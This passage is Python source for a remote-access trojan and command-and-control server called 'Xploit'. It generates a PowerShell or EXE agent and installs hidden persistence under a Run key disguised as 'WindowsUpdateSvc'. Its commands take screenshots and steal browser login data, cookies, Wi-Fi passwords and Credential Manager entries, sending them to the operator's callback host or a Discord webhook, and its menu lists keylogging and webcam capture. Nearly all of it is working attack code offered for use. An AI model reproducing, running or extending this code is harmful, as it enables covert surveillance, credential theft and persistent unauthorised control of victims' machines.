            "$rk='HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';"
            "Set-ItemProperty -Path $rk -Name 'WindowsUpdateSvc' "
            "-Value \"wscript.exe //B //Nologo `\"$vp`\"\";"
            "$dp='HKCU:\\SOFTWARE\\WindowsUpdate';"
            "if(-not(Test-Path $dp)){New-Item $dp -Force|Out-Null};"
            f"Set-ItemProperty -Path $dp -Name cb -Value '{safe_url}';"
            "Write-Output '[+] Persistence installed (VBScript silent launcher). No window flash on next login.'"
        )
        self.log_sys("[*] Installing persistence...")
        self._thread(lambda: self.log(_send(ps)))

    def _do_persist_update_url(self):
        if not self._need_session(): return
        new_url = simpledialog.askstring(
            "Update Callback URL",
            "New callback URL (e.g. https://xyz.ngrok-free.app):",
            parent=self.root)
        if not new_url: return
        new_url  = new_url.strip().rstrip("/")
        safe_new = new_url.replace("'", "''")
        ps = (
            "$dp='HKCU:\\SOFTWARE\\WindowsUpdate';"
            "if(-not(Test-Path $dp)){New-Item $dp -Force|Out-Null};"
            f"Set-ItemProperty -Path $dp -Name cb -Value '{safe_new}';"
            f"Write-Output '[+] Callback URL updated to {new_url}. Agent will use it on next poll.'"
        )
        self._thread(lambda: self.log(_send(ps)))

    def _do_persist_rm(self):
        if not self._need_session(): return
        if not messagebox.askyesno("Remove Persistence",
                                   "Remove the Run key + VBScript launcher from the target?",
                                   parent=self.root): return
        ps = (
            "$rk='HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';"
            "Remove-ItemProperty -Path $rk -Name 'WindowsUpdateSvc' -EA 0;"
            "$dp='HKCU:\\SOFTWARE\\WindowsUpdate';"
            "Remove-ItemProperty -Path $dp -Name cb -EA 0;"
            "$vd=\"$env:APPDATA\\WUpdate\";"
            "if(Test-Path $vd){Remove-Item $vd -Recurse -Force -EA 0};"
            "Write-Output '[+] Persistence fully removed (Run key + VBS launcher deleted).'"
        )
        self._thread(lambda: self.log(_send(ps)))

    def _do_kill_agent(self):
        if not self._need_session(): return
        if not messagebox.askyesno("Kill Agent",
                                   "Kill the active agent process on the remote machine?",
                                   icon="warning", parent=self.root): return
        def _do():
            global ACTIVE_SESSION_ID
            _send("Stop-Process -Id $PID -Force", timeout=5.0)
            if ACTIVE_SESSION_ID: SM.stop(ACTIVE_SESSION_ID)
            self.log_sys("[*] Agent killed.")
            ACTIVE_SESSION_ID = None
            self.root.after_idle(lambda: self._update_prompt(None))
            self.root.after_idle(self._refresh_sessions)
        self._thread(_do)

    # ── Close handler ─────────────────────────────────────────────────────────────
    def _on_close(self):
        if messagebox.askyesno("Exit Xploit",
                               "Shut down Xploit and terminate all connected agents?",
                               icon="warning", parent=self.root):
            self.root.destroy()
            _shutdown()
            os._exit(0)




def _shutdown():
    """
    Graceful multi-step shutdown:
      1. Send Stop-Process to every Running session (kills agent processes → clears SYN_SENT)
      2. Signal uvicorn to stop accepting new connections
      3. Join the listener thread (waits for the OS to release port 8080)
      4. Force-exit if join times out
    TIME_WAIT entries are kernel-owned and clear automatically in ~60 s;
    SO_REUSEADDR (already set) lets the next run re-bind immediately anyway.
    """
    global _uvicorn_server, _listener_thread

    # ── Step 1: kill all agent processes so they stop retrying (kills SYN_SENT) ──
    running = [s for s in SM.list_all() if s.status == "Running"]
    if running:
        print(f"[*] Sending kill signal to {len(running)} active session(s)...")
        for s in running:
            try:
                s.current_task = "Stop-Process -Id $PID -Force"
                s.task_result  = None
            except Exception:
                pass
            SM.stop(s.session_id)
        # Give agents ~2 s to receive the kill task before we close the listener
        time.sleep(2.0)

    # ── Step 2: tell uvicorn to exit cleanly ──────────────────────────────────
    if _uvicorn_server:
        _uvicorn_server.should_exit = True

    # ── Step 3: wait for the listener thread to finish closing the socket ─────
    if _listener_thread and _listener_thread.is_alive():
        _listener_thread.join(timeout=6.0)   # uvicorn usually exits in <2 s
        if _listener_thread.is_alive():
            # Force-exit path: thread is stuck, hammer it
            if _uvicorn_server:
                _uvicorn_server.force_exit = True
            _listener_thread.join(timeout=2.0)


# ── FastAPI routes ────────────────────────────────────────────────────────────
@app.post("/checkin")
async def checkin(request: Request):
    body = await request.body()
    try:
        dec   = base64.b64decode(body).decode('utf-8', errors='ignore').strip()
        parts = dec.split("|")
        # Checkin body format (v2): uid|COMPUTERNAME|user|cwd  (4 parts)
        # Legacy format (v1)      : COMPUTERNAME|user|cwd      (3 parts)
        if len(parts) >= 4:
            machine_uid = parts[0].strip()
            hostname    = parts[1].strip()
            username    = parts[2].strip()
            cwd         = parts[3].strip()
        elif len(parts) >= 3:
            machine_uid = ""
            hostname    = parts[0].strip()
            username    = parts[1].strip()
            cwd         = parts[2].strip()
        else:
            machine_uid = ""
            hostname    = request.client.host
            username    = "unknown"
            cwd         = "C:\\\\"
        ip  = request.client.host
        s   = SM.register(ip, hostname, username, cwd, machine_uid)
        # ── Notify GUI if running in GUI mode ─────────────────────────────────
        if _GUI_INSTANCE is not None:
            _GUI_INSTANCE.notify_checkin(s)
        sys.stdout.write(
            f"\n\n[+] Check-in: {s.session_id} | {hostname} ({username}) @ {ip}\n"
            f"[*] CWD: {cwd}\n\nxploit> "
        )
        sys.stdout.flush()
        headers = {"X-Session-ID": s.session_id}
        return Response(content="ok", media_type="text/plain", headers=headers)
    except Exception as e:
        sys.stdout.write(f"\n[!] checkin error: {e}\n")
        sys.stdout.flush()
        return Response(content="ok", media_type="text/plain")


@app.get("/get_task")
async def get_task(request: Request):
    # Primary: use X-Session-ID header (set by agent after check-in)
    # Fallback: match by hostname sent in X-Agent-Hostname header
    sid = request.headers.get("X-Session-ID", "").strip()
    s   = SM.get(sid) if sid else None
    if s is None:
        hn = request.headers.get("X-Agent-Hostname", "").strip()
        s  = SM.get_by_hostname(hn) if hn else None
    if s is None or s.status == "Stopped":
        return Response(content="", media_type="text/plain")
    assert s is not None  # type narrowing for Pyre2
    # Update heartbeat timestamp so we can detect offline agents
    s.last_seen = time.time()
    # Only update CWD from the header if the session has NO task currently
    # queued or running — prevents a stale background agent from silently
    # overwriting CWD mid-command and causing directory jumps.
    cwd = request.headers.get("X-Agent-CWD", "").strip()
    if cwd and not s.current_task:
        s.cwd = cwd
    if s.current_task:
        t              = s.current_task
        s.current_task = ""
        return Response(content=t, media_type="text/plain")
    return Response(content="", media_type="text/plain")


@app.post("/submit_result")
async def submit_result(request: Request):
    sid = request.headers.get("X-Session-ID", "").strip()
    s   = SM.get(sid) if sid else None
    if s is None:
        hn = request.headers.get("X-Agent-Hostname", "").strip()
        s  = SM.get_by_hostname(hn) if hn else None
    if s is None:
        return {"status": "ok"}
    body = await request.body()
    if not body:            # agent sent empty result (no-output command) — just ACK
        return {"status": "ok"}
    try:
        dec  = base64.b64decode(body).decode('utf-8', errors='ignore').strip()
        if not dec:
            return {"status": "ok"}
        out, cwd = parse_agent_response(dec)
        s.task_result = out or "(no output)"
        if cwd:
            s.cwd = cwd
    except Exception:
        s.task_result = "(no output)"   # swallow decode errors, never 500
    return {"status": "ok"}


@app.post("/upload")
async def upload_file(file: UploadFile = File(...)):
    for d in ("./exfil", "./recordings", "./images"):
        os.makedirs(d, exist_ok=True)
    name = file.filename
    if name.lower().endswith(".avi"):
        dest = f"./recordings/{name}"
    elif name.lower().startswith("pic_"):
        dest = f"./images/{name}"
    else:
        dest = f"./exfil/{name}"
    try:
        with open(dest, "wb") as f:
            shutil.copyfileobj(file.file, f)
        print(f"\n[!] Received: {name} \u2192 {dest}")
        # ── Notify GUI if running in GUI mode ─────────────────────────────────
        if _GUI_INSTANCE is not None:
            _GUI_INSTANCE.notify_upload(name, dest)
    except Exception as e:
        print(f"\n[-] Upload error: {e}")
    finally:
        act = _active_session()
        if act:
            sys.stdout.write(f"PS {act.cwd}> ")
        else:
            sys.stdout.write("xploit> ")
        sys.stdout.flush()
    return {"filename": name}


# ── Listener ──────────────────────────────────────────────────────────────────
def start_listener(host: str, port: int):
    global _uvicorn_server
    import logging
    logging.getLogger("uvicorn").setLevel(logging.CRITICAL)
    logging.getLogger("uvicorn.access").setLevel(logging.CRITICAL)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.listen(128)
    except OSError as e:
        print(f"\n[!] Cannot bind {host}:{port} — {e}")
        os._exit(1)
    cfg = uvicorn.Config(app, log_level="critical")
    srv = uvicorn.Server(cfg)
    _uvicorn_server = srv
    try:
        srv.run(sockets=[sock])
    finally:
        try:
            sock.close()
        except Exception:
            pass


# ── Session registry helpers ──────────────────────────────────────────────────
def _print_sessions():
    try:
        import socket as _s
        with _s.socket(_s.AF_INET, _s.SOCK_DGRAM) as _sk:
            _sk.connect(("8.8.8.8", 80))
            _local_ip = _sk.getsockname()[0]
    except Exception:
        _local_ip = ""

    sessions = SM.list_all()
    if not sessions:
        print("  [*] No active sessions yet.")
        return
    C = "\033[38;5;51m"
    M = "\033[38;5;171m"
    P = "\033[38;5;135m"
    G = "\033[38;5;82m"
    R = "\033[38;5;196m"
    W = "\033[1;37m"
    X = "\033[0m"
    print(f"\n{P}  ╔══════════╦══════════════════════════════╦═══════════════════╦═══════════╗")
    print(f"{P}  ║{C} Session  {P}║{C} Host / User                  {P}║{C} IP                {P}║{C} Status    {P}║")
    print(f"{P}  ╠══════════╬══════════════════════════════╬═══════════════════╬═══════════╣")
    for s in sessions:
        is_offline = s.status == "Running" and s.last_seen > 0 and (time.time() - s.last_seen) > 12
        if s.status == "Stopped":
            col = R
        elif is_offline:
            col = "\033[38;5;214m"   # orange = offline but not stopped
        else:
            col = G
        status_str = "Offline" if is_offline else s.status
        local_marker = f" {R}[LOCAL]{X}" if s.ip in ("127.0.0.1", _local_ip) else ""
        info = f"{s.hostname} / {s.username}"
        print(
            f"{P}  ║{W} {s.session_id:<8} {P}║{W} {info:<28} {P}║{W} {s.ip:<17} {P}║{col} {status_str:<9} {P}║{local_marker}"
        )
    print(f"{P}  ╚══════════╩══════════════════════════════╩═══════════════════╩═══════════╝{X}\n")


# ── IP detection ─────────────────────────────────────────────────────────────
def _detect_ips() -> tuple:
    """Return (local_ip, public_ip) strings. Falls back gracefully on errors."""
    import urllib.request

    # Local IP — open a UDP socket, read the OS-assigned source address
    local_ip = "unavailable"
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
    except Exception:
        pass

    # Public IP — try two services with a short timeout
    public_ip = "unavailable"
    for url in ("https://api.ipify.org", "https://ipecho.net/plain"):
        try:
            with urllib.request.urlopen(url, timeout=4) as r:
                public_ip = r.read().decode().strip()
            break
        except Exception:
            continue

    return local_ip, public_ip


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    global ACTIVE_SESSION_ID, LHOST, CALLBACK_HOST, LPORT, _listener_thread, CALLBACK_URL

    os.system("")  # Enable ANSI escape sequences on Windows terminals
    C = "\033[38;5;51m"   # Cyan
    P = "\033[38;5;135m"  # Deep Purple
    M = "\033[38;5;171m"  # Magenta
    G = "\033[38;5;82m"   # Green
    R = "\033[38;5;196m"  # Red
    W = "\033[1;37m"      # Bright White
    B = "\033[38;5;213m"  # Magenta
    X = "\033[0m"         # Reset
    O = "\033[38;5;208m"  # Orange
    w = "\033[1;37m"      # Bright White
    print(f"""

{B}                                    dP          oo   dP   
{B}                                    88               88   
{B}                  dP.  .dP 88d888b. 88 .d8888b. dP d8888P 
{M}                   `8bd8'  88'  `88 88 88'  `88 88   88   
{M}                   .d88b.  88.  .88 88 88.  .88 88   88   
{P}                  dP'  `dP 88Y888P' dP `88888P' dP   dP   
{P}                            88                             
{P}                            dP                             
                                                           

{P}                    [{M}made with {M}♥{M} by {M}arxncodes & aashay{P}]

{M}         ╔══════════════════ {P}Session Commands{P} ════════════════════╗
{M}         ║  {W}list-sessions     connect <id>      persist           {M}║
{M}         ║  {W}session-exit      session-stop <id> persist-rm        {M}║
{M}         ║  {W}persist-update-url                                    {M}║
{M}         ╠══════════════════ {P}Agent Commands{P} ══════════════════════╣
{M}         ║  {W}screenshot  pic  harvest-browsers   download          {M}║
{M}         ║  {W}dump / dump-all  dump-os  dump-wifi  dump-credman     {M}║
{M}         ║  {W}key-capture      exit-capture       kill-agent        {M}║
{M}         ║  {W}livecam-start    livecam-stop       livecam-save      {M}║
{M}         ╚════════════════════════════════════════════════════════{M}╝
    """)

    # ── Detect IPs and show startup prompt ────────────────────────────────────
    print(f"\n{P}[{M}*{P}] {W}Detecting network addresses...{X}")
    local_ip, public_ip = _detect_ips()
    print(f"{P}[{C}>{P}] {W}Local  IP : {G}{local_ip:<20}{W}  ← LAN/VM targets")
    print(f"{P}[{C}>{P}] {W}Public IP : {G}{public_ip:<20}{W}  ← internet targets {M}(needs port forwarding on router){X}\n")

    h = input(f"{P}[{C}?{P}] {W}CALLBACK HOST (or ngrok URL) [{C}{public_ip}{W}]: {X}").strip()
    CALLBACK_HOST = h if h else public_ip
    p = input(f"{P}[{C}?{P}] {W}LPORT [{C}8080{W}]: {X}").strip()
    LPORT = int(p) if p else 8080
    
    if CALLBACK_HOST.startswith("http://") or CALLBACK_HOST.startswith("https://"):
        CALLBACK_URL = CALLBACK_HOST
        if CALLBACK_URL.endswith("/"):
            CALLBACK_URL = CALLBACK_URL[:-1]
    else:
        CALLBACK_URL = f"http://{CALLBACK_HOST}:{LPORT}"

    # Server always binds 0.0.0.0 — accepts connections on ALL interfaces
    LHOST = "0.0.0.0"

    # Always start the listener regardless of mode
    _listener_thread = threading.Thread(target=start_listener, args=(LHOST, LPORT), daemon=True)
    _listener_thread.start()
    time.sleep(0.8)

    # ── Payload format selection ───────────────────────────────────────────────
    print("")
    print("  +------------------------------------------+")
    print("  |        SELECT PAYLOAD FORMAT             |")
    print("  |  [1] PowerShell  -- CLI mode (default)   |")
    print("  |  [2] EXE         -- GUI console mode     |")
    print("  +------------------------------------------+")
    fmt = ""
    while fmt not in ("1", "2"):
        try:
            fmt = input("  Select [1/2]: ").strip()
        except (EOFError, KeyboardInterrupt):
            fmt = "1"
            break
        if fmt == "":
            fmt = "1"   # default to PS if user just hits Enter
            break

    if fmt == "2":
        if not _TK_AVAILABLE:
            print(f"\n{R}[!] tkinter is not available. Falling back to PowerShell mode.{X}\n")
        else:
            print(f"\n{P}[{M}*{P}] {W}Generating agent files...{X}")
            agent_info = generate_exe_payload(CALLBACK_URL)
            print(f"\n{G}{agent_info}{X}\n")
            print(f"{P}[{M}*{P}] {W}Listener on {C}0.0.0.0:{LPORT}{W} -- launching GUI...{X}\n")
            try:
                gui = XploitGUI(CALLBACK_URL)
                gui.run()
            except KeyboardInterrupt:
                pass
            finally:
                _shutdown()
                print("[*] GUI closed. All sessions killed.")
                os._exit(0)
            return   # unreachable, but explicit

    # ── Default: PowerShell Command mode ──────────────────────────────────────
    payload = generate_ps_payload(CALLBACK_URL)
    print(f"\n{P}[{G}+{P}] {W}Payload ({M}{CALLBACK_URL}{W}):\n{C}{payload}{X}\n")
    print(f"{P}[{M}*{P}] {W}Listener bound on {C}0.0.0.0:{LPORT}{W} -- waiting for agent check-ins ...{X}\n")

    try:
        while True:
            # ── Registry mode prompt ───────────────────────────────────────
            if ACTIVE_SESSION_ID is None:
                try:
                    cmd = input(f"\n{M}xploit{C}>{X} ").strip()
                except EOFError:
                    break
                if not cmd:
                    continue
                c = cmd.lower()

                # exit / quit
                if c in ("exit", "quit"):
                    print("[*] Exiting.")
                    break

                # list-sessions
                if c == "list-sessions":
                    _print_sessions()
                    continue

                # connect <session_id>
                if c.startswith("connect "):
                    sid = cmd.split(" ", 1)[1].strip().upper()
                    s   = SM.get(sid)
                    if s is None:
                        print(f"[-] Session '{sid}' not found. Use list-sessions.")
                    elif s.status == "Stopped":
                        print(f"[-] Session '{sid}' is stopped.")
                    else:
                        ACTIVE_SESSION_ID = sid
                        print(f"[+] Connected to {sid} ({s.hostname} / {s.username})")
                    continue

                # session-stop <session_id>
                if c.startswith("session-stop "):
                    sid = cmd.split(" ", 1)[1].strip().upper()
                    s   = SM.get(sid)
                    if s is None:
                        print(f"[-] Session '{sid}' not found.")
                    elif s.status == "Stopped":
                        print(f"[*] Session '{sid}' already stopped.")
                    else:
                        # Tell the agent to kill itself
                        prev = ACTIVE_SESSION_ID
                        ACTIVE_SESSION_ID = sid
                        _send("Stop-Process -Id $PID -Force", timeout=5.0)
                        ACTIVE_SESSION_ID = prev
                        SM.stop(sid)
                        print(f"[+] Session {sid} stopped.")
                    continue

                # kill-all — kill every running agent and clear the session store
                if c == "kill-all":
                    count = SM.kill_all()
                    if count:
                        P2 = "\033[38;5;135m"; G2 = "\033[38;5;82m"; X2 = "\033[0m"
                        print(f"{P2}[{G2}+{P2}] {G2}Killed {count} agent(s) and cleared all sessions.{X2}")
                        print(f"{P2}[{G2}+{P2}] {G2}Session counter reset. Next check-in will be SES-001.{X2}")
                    else:
                        print("[*] No running sessions to kill.")
                    continue

                # clear-sessions — wipe stale / already-stopped sessions without kill signals
                if c == "clear-sessions":
                    count = SM.clear_all()
                    print(f"[+] Cleared {count} session entries. Counter reset — next check-in will be SES-001.")
                    continue

                print(f"[-] Unknown command. Type list-sessions or connect <id>.")
                continue

            # ── Session mode prompt ────────────────────────────────────────
            s = SM.get(ACTIVE_SESSION_ID)
            if s is None or s.status == "Stopped":
                print(f"\n[!] Session {ACTIVE_SESSION_ID} is no longer active.")
                ACTIVE_SESSION_ID = None
                continue

            try:
                cmd = input(f"\n{M}PS {C}{s.cwd}{W}> {X}").strip()
            except EOFError:
                break

            if not cmd:
                continue

            c = cmd.lower()

            # exit / quit (global)
            if c in ("exit", "quit"):
                print("[*] Exiting.")
                break

            # session-exit — return to registry
            if c == "session-exit":
                print(f"[*] Detached from {ACTIVE_SESSION_ID}. Session remains active.")
                ACTIVE_SESSION_ID = None
                continue

            # list-sessions (available in both modes)
            if c == "list-sessions":
                _print_sessions()
                continue

            # kill-agent
            if c == "kill-agent":
                _send("Stop-Process -Id $PID -Force", timeout=5.0)
                SM.stop(ACTIVE_SESSION_ID)
                print("[*] Agent killed.")
                ACTIVE_SESSION_ID = None
                continue

            # persist — VBScript silent launcher + registry Run key
            # Uses wscript.exe //B to launch the PS agent with OS-level window
            # style 0 — completely eliminates the 1-second PowerShell flash.
            if c == "persist":
                payload_cmd = generate_ps_payload(CALLBACK_URL)
                safe_url    = CALLBACK_URL.replace("'", "''")
                # Escape double-quotes inside the VBScript string literal
                vbs_ps_cmd  = payload_cmd.replace('"', '""')
                # The VBScript content — launches PS hidden at OS level (style 0)
                vbs_content = (
                    f'CreateObject("WScript.Shell").Run "{vbs_ps_cmd}", 0, False'
                )
                # Escape VBS content for embedding inside a PS here-string @' '@
                vbs_escaped = vbs_content.replace("'", "''")  # PS single-quote escape
                ps = (
                    # 1. Create the drop folder
                    "$vd=\"$env:APPDATA\\WUpdate\";"
                    "New-Item -ItemType Directory $vd -Force|Out-Null;"
                    # 2. Write the VBScript launcher
                    "$vp=\"$vd\\svc.vbs\";"
                    f"Set-Content -Path $vp -Value '{vbs_escaped}' -Encoding ASCII;"
                    # 3. Register wscript.exe in the Run key (zero window, no flash)
                    "$rk='HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';"
                    "Set-ItemProperty -Path $rk -Name 'WindowsUpdateSvc' "
                    "-Value \"wscript.exe //B //Nologo `\"$vp`\"\";"
                    # 4. Store the callback URL so the agent reads it from registry on boot
                    "$dp='HKCU:\\SOFTWARE\\WindowsUpdate';"
                    "if(-not(Test-Path $dp)){New-Item $dp -Force|Out-Null};"
                    f"Set-ItemProperty -Path $dp -Name cb -Value '{safe_url}';"
                    "Write-Output '[+] Persistence installed (VBScript silent launcher). No window flash on next login.'"
                )
                print(_send(ps))
                continue

            # persist-update-url — push a new ngrok URL to the persisted agent WITHOUT reinstalling
            if c == "persist-update-url":
                new_url = input("[?] New callback URL (e.g. https://xyz.ngrok-free.app): ").strip()
                if not new_url:
                    print("[-] Cancelled.")
                    continue
                if new_url.endswith("/"):
                    new_url = new_url[:-1]
                safe_new = new_url.replace("'", "''")
                ps = (
                    "$dp='HKCU:\\SOFTWARE\\WindowsUpdate';"
                    "if(-not(Test-Path $dp)){New-Item $dp -Force|Out-Null};"
                    f"Set-ItemProperty -Path $dp -Name cb -Value '{safe_new}';"
                    f"Write-Output '[+] Callback URL updated to {new_url}. Agent will use it on next poll.'"
                )
                print(_send(ps))
                continue

            # persist-rm — remove Run key, VBScript file, and stored callback URL
            if c in ("persist-rm", "persist-remove"):
                ps = (
                    "$rk='HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';"
                    "Remove-ItemProperty -Path $rk -Name 'WindowsUpdateSvc' -EA 0;"
                    "$dp='HKCU:\\SOFTWARE\\WindowsUpdate';"
                    "Remove-ItemProperty -Path $dp -Name cb -EA 0;"
                    # Also wipe the VBScript launcher file and its folder
                    "$vd=\"$env:APPDATA\\WUpdate\";"
                    "if(Test-Path $vd){Remove-Item $vd -Recurse -Force -EA 0};"
                    "Write-Output '[+] Persistence fully removed (Run key + VBS launcher deleted).'"
                )
                print(_send(ps))
                continue

            # screenshot
            if c == "screenshot":
                print("[*] Capturing screen...")
                url = CALLBACK_URL
                ps = (
                    "$t=\"$env:TEMP\\sc$(Get-Date -Format 'yyyyMMddHHmmss').png\";"
                    "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
                    "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
                    "$bmp=New-Object System.Drawing.Bitmap($s.Width,$s.Height);"
                    "$g=[System.Drawing.Graphics]::FromImage($bmp);"
                    "$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);"
                    "$g.Dispose();"
                    "$bmp.Save($t,[System.Drawing.Imaging.ImageFormat]::Png);"
                    "$bmp.Dispose();"
                    "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
                    f"try{{$wcu.UploadFile('{url}/upload',$t)}}catch{{}};$wcu.Dispose();"
                    "Remove-Item $t -Force;"
                    "Write-Output '[+] Screenshot uploaded.'"
                )
                print(_send(ps))
                continue

            # harvest-browsers
            if c == "harvest-browsers":
                print("[*] Harvesting browser/WiFi/cred data...")
                url = CALLBACK_URL
                ps = (
                    "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
                    "$d=\"$env:TEMP\\harv_$ts\";"
                    "New-Item -ItemType Directory $d -Force|Out-Null;"
                    "cmdkey /list|Out-File \"$d\\credman.txt\" -Encoding UTF8;"
                    "$w=@();netsh wlan show profiles|Select-String 'All User Profile'|ForEach-Object{"
                    "$n=($_ -split ':',2)[1].Trim();"
                    "$raw=(& cmd /c \"netsh wlan show profile name=`\"$n`\" key=clear\") -join \"`n\";"
                    "$key=if($raw -match 'Key Content\\s+:\\s+(.+)'){$Matches[1].Trim()}else{'(none)'};"
                    "$w+=\"$n - $key\"};" + "\n"
                    "$w|Out-File \"$d\\wifi.txt\" -Encoding UTF8;"
                    "$bd=\"$d\\browsers\";New-Item -ItemType Directory $bd -Force|Out-Null;"
                    "@{Chrome=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\";"
                    "Edge=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\"}.GetEnumerator()|ForEach-Object{"
                    "if(Test-Path $_.Value){"
                    "$dst=\"$bd\\$($_.Key)\";New-Item -ItemType Directory $dst -Force|Out-Null;"
                    "foreach($f in @('Login Data','Cookies','History','Web Data')){"
                    "$fp=\"$($_.Value)\\$f\";if(Test-Path $fp){Copy-Item $fp \"$dst\\$f\" -Force}}}};"
                    "$zip=\"$env:TEMP\\harv_$ts.zip\";"
                    "Compress-Archive -Path $d -DestinationPath $zip -Force;"
                    "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
                    f"try{{$wcu.UploadFile('{url}/upload',$zip)}}catch{{}};$wcu.Dispose();"
                    "Remove-Item $d -Recurse -Force -EA 0;Remove-Item $zip -Force -EA 0;"
                    "Write-Output '[+] Harvest zip uploaded → ./exfil/'"
                )
                print(_send(ps, timeout=90.0))
                continue

            # dump (help)
            if c == "dump":
                print("\n  dump sub-commands:")
                print("    dump-all      — full harvest ZIP → Discord webhook")
                print("    dump-os       — OS/hardware info → Discord chat")
                print("    dump-wifi     — WiFi passwords   → Discord chat")
                print("    dump-credman  — Credential Mgr   → Discord chat")
                continue

            # dump-os
            if c == "dump-os":
                whu = _ask_webhook()
                if not whu:
                    continue
                print("[*] Dumping OS info to Discord...")
                ps = (
                    _DISCORD_TEXT +
                    "$osi=Get-WmiObject Win32_OperatingSystem;"
                    "$cpu=(Get-WmiObject Win32_Processor|Select-Object -First 1).Name;"
                    "$ram=[Math]::Round($osi.TotalVisibleMemorySize/1MB,2);"
                    "$dsk=Get-PSDrive C;"
                    "$ips=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{$_.IPAddress -ne '127.0.0.1'}).IPAddress -join ', ';"
                    "$msg='__**OS Dump: '+$env:COMPUTERNAME+'**__'+\"`n\"+'```'+\"`n\";"
                    "$msg+='Host    : '+$env:COMPUTERNAME+\"`n\";"
                    "$msg+='User    : '+$env:USERNAME+' ('+$env:USERDOMAIN+')'+\"`n\";"
                    "$msg+='OS      : '+$osi.Caption+' '+$osi.OSArchitecture+\"`n\";"
                    "$msg+='CPU     : '+$cpu+\"`n\";"
                    "$msg+='RAM     : '+$ram+' GB'+\"`n\";"
                    "$msg+='Disk    : '+[Math]::Round($dsk.Used/1GB,1)+' GB used / '+[Math]::Round($dsk.Free/1GB,1)+' GB free'+\"`n\";"
                    "$msg+='IPs     : '+$ips+\"`n\"+'```';"
                    f"_DS '{whu}' $msg;"
                    "Write-Output '[+] OS info sent to Discord.'"
                )
                print(_send(ps, timeout=30.0))
                continue

            # dump-wifi
            if c == "dump-wifi":
                whu = _ask_webhook()
                if not whu:
                    continue
                print("[*] Dumping WiFi passwords to Discord...")
                ps = (
                    _DISCORD_TEXT +
                    "$prfs=netsh wlan show profiles|Select-String 'All User Profile';"
                    "if(-not $prfs){Write-Output '[-] No WiFi profiles.'}else{"
                    "$msg='__**WiFi Passwords: '+$env:COMPUTERNAME+'**__'+\"`n\";"
                    "$prfs|ForEach-Object{"
                    "$n=($_ -split ':',2)[1].Trim();"
                    "$raw=(& cmd /c (\"netsh wlan show profile name=`\"`\"$n`\"`\" key=clear\")) -join \"`n\";"
                    "$key=if($raw -match 'Key Content\\s+:\\s+(.+)'){$Matches[1].Trim()}else{'(none)'};"
                    "$msg+=\"`n**\"+$n+\"**`nPassword: ``\"+$key+\"``\"+\"`n\"};"
                    f"_DS '{whu}' $msg;"
                    "Write-Output '[+] WiFi data sent to Discord.'}"
                )
                print(_send(ps, timeout=60.0))
                continue

            # dump-credman
            if c == "dump-credman":
                whu = _ask_webhook()
                if not whu:
                    continue
                print("[*] Dumping Credential Manager to Discord...")
                ps = (
                    _DISCORD_TEXT +
                    "$raw=(cmdkey /list) -join \"`n\";"
                    "$msg='__**Credential Manager: '+$env:COMPUTERNAME+'**__'+\"`n\"+'```'+\"`n\"+$raw+\"`n\"+'```';"
                    f"_DS '{whu}' $msg;"
                    "Write-Output '[+] Credential Manager sent to Discord.'"
                )
                print(_send(ps, timeout=30.0))
                continue

            # dump-all
            if c == "dump-all":
                whu = _ask_webhook()
                if not whu:
                    continue
                print("[*] Running full dump (30–90 s) ...")
                ps = (
                    _DISCORD_UPLOAD +
                    "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
                    "$d=\"$env:TEMP\\dump_$ts\";"
                    "New-Item -ItemType Directory $d -Force|Out-Null;"
                    "$osi=Get-WmiObject Win32_OperatingSystem;"
                    "$cpu=(Get-WmiObject Win32_Processor|Select-Object -First 1).Name;"
                    "@('=== SYSTEM INFO ===',\"Host: $env:COMPUTERNAME\",\"User: $env:USERNAME\","
                    "\"OS: $($osi.Caption)\",\"CPU: $cpu\","
                    "\"RAM: $([Math]::Round($osi.TotalVisibleMemorySize/1MB,2)) GB\")"
                    "|Out-File \"$d\\sysinfo.txt\" -Encoding UTF8;"
                    "cmdkey /list|Out-File \"$d\\credman.txt\" -Encoding UTF8;"
                    "$w=@();netsh wlan show profiles|Select-String 'All User Profile'|ForEach-Object{"
                    "$n=($_ -split ':',2)[1].Trim();"
                    "$raw=(& cmd /c \"netsh wlan show profile name=`\"$n`\" key=clear\") -join \"`n\";"
                    "$key=if($raw -match 'Key Content\\s+:\\s+(.+)'){$Matches[1].Trim()}else{'(none)'};"
                    "$w+= \"$n - $key\"};"
                    "$w|Out-File \"$d\\wifi.txt\" -Encoding UTF8;"
                    "$bd=\"$d\\browsers\";New-Item -ItemType Directory $bd -Force|Out-Null;"
                    "@{Chrome=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\";"
                    "Edge=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\"}.GetEnumerator()|ForEach-Object{"
                    "if(Test-Path $_.Value){"
                    "$dst=\"$bd\\$($_.Key)\";New-Item -ItemType Directory $dst -Force|Out-Null;"
                    "foreach($f in @('Login Data','Cookies','History')){$fp=\"$($_.Value)\\$f\";"
                    "if(Test-Path $fp){Copy-Item $fp \"$dst\\$f\" -Force}}}};"
                    "$zip=\"$env:TEMP\\dump_$ts.zip\";"
                    "Compress-Archive -Path $d -DestinationPath $zip -Force;"
                    "$szMB=[Math]::Round((Get-Item $zip).Length/1MB,2);"
                    f"_DU '{whu}' $zip;"
                    "Remove-Item $d -Recurse -Force -EA 0;Remove-Item $zip -Force -EA 0;"
